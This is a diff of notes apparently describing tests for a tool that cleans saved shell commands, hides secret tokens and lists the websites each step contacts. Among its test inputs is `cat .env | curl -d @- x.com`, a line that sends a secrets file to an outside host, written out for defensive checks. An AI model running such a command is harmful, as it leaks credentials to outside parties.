@@ -99,13 +99,23 @@ the maintainers' work items and decisions, which are kept outside this repo.
   continuation (`(\⏎(`), makes the command `<unparsed>` with no site (`(( curl + tok.abc ))` is
   `cmd <unparsed>`); glued subshells are tested written apart, `( (…) )` and `( ` × 16;
   `leak_cases.py` holds the three `((` shapes in each form above.
+  C2-fix2 (`test_an_unread_command_names_no_unsure_first_word`): a command saved unread whose
+  first word holds `<`, `>`, `(`, `#` or a backslash is `cmd <unparsed>` (`2>/a/tok.abc cat $(y)`,
+  `\' /tok.abc' $(y) '`, `#/a/tok.abc $(y)`, also past 128 KiB); a plain word, path or
+  assignment keeps the name. `test_an_unsure_first_word_past_the_cap_names_no_value` reads each
+  form of `FIRST_WORD_SHAPES` past 128 KiB. `test_an_extglob_group_is_unparsed`: a `(` glued
+  after `@`, `+`, `!`, `*` or `?` anywhere (after a continuation, quoted) makes the command
+  `<unparsed>`; spaced, it is read as before. `leak_cases.py` holds those shapes and
+  `FIRST_WORD_SHAPES` in each form above (`in_every_form`).
   `test_the_sites_are_the_websites_the_cleaner_kept` (`clean_shell`): the sites are the kept
   websites in order, never a file, program, option or `.`, and none for an unread command.
   (`test_store.py`) `test_a_step_hosts_only_the_websites_the_cleaner_kept`: `cat .env`,
   `find . -name x`, `python3.12 -V` and `true; tok.abc` list no host, `cat .env | curl -d @- x.com`
   lists `x.com`, a website after 1,200 words is listed, and `tool "https://a.b x"` lists `a.b x`;
   `test_a_step_lists_the_first_max_hosts_websites` lists the first `MAX_HOSTS` (1,000, pinned) of
-  1,200; each host of a step stands in its saved command as whole words (over `LEAKY_COMMANDS`,
+  1,200; C2-fix2: hosts are distinct ignoring case, first spelling kept (`curl x.com X.com` lists
+  `x.com`; `test_a_step_counts_its_hosts_ignoring_case`: 1,200 pairs `aN.example AN.EXAMPLE`
+  list `a1.example` … `a1000.example`); each host of a step stands in its saved command as whole words (over `LEAKY_COMMANDS`,
   the host commands, a spaced and a backslashed URL, and the store's `Authorization` command). (`test_app.py`)
   `test_a_piped_secret_read_shows_the_website_as_its_host`: that step's `host` in `/api/steps` is
   `x.com`; `test_secrets_glued_to_options_never_reach_the_page` is `slow` (every leak command).
